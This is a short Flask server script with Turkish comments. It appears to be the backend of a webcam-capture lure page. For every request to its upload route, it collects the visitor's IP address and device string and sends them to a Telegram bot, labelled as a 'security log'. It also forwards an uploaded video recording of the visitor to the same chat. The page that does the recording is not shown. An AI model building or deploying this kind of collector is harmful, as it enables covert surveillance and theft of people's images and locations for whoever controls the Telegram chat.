import os
import telebot
from flask import Flask, render_template, request
import tempfile

app = Flask(__name__)
TOKEN = os.environ.get("TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")
bot = telebot.TeleBot(TOKEN)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/medya-gonder', methods=['POST'])
def medya_gonder():
    # 1. IP ve Cihaz Bilgilerini Al
    ip_adresi = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip_adresi:
        ip_adresi = ip_adresi.split(',')[0]
    cihaz = request.headers.get('User-Agent', 'Bilinmeyen Cihaz')
    
    log_mesaj = f"🛡️ GÜVENLİK LOGU 🛡️\n\n🌐 IP Adresi: {ip_adresi}\n📱 Cihaz: {cihaz}\nDurum: Kullanıcı 5+ saniyelik video kaydını gönderdi."
    
    try:
        bot.send_message(CHAT_ID, log_mesaj)
    except Exception as e:
        print("Log hatası:", e)

    # 2. Videoyu Al, Kaydet ve Telegram'dan Gönder
    if 'video' in request.files:
        video_dosyasi = request.files['video']
        
        # Videoyu Render sunucusuna geçici olarak kaydet
        with tempfile.NamedTemporaryFile(delete=False, suffix='.mp4') as temp_video:
            video_dosyasi.save(temp_video.name)
            temp_path = temp_video.name
            
        try:
            # Kaydedilen videoyu bota okut ve gönder
            with open(temp_path, 'rb') as video_icerik:
                bot.send_video(CHAT_ID, video_icerik, caption="🎥 Yeni video kaydı başarıyla alındı!")
            
            # İşlem bitince sunucudaki videoyu sil (Hafıza dolmasın)
            os.remove(temp_path)
            return "OK", 200
        except Exception as e:
            print("Video gönderme hatası:", e)
            return "HATA", 500
            
    return "Video bulunamadı", 400

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
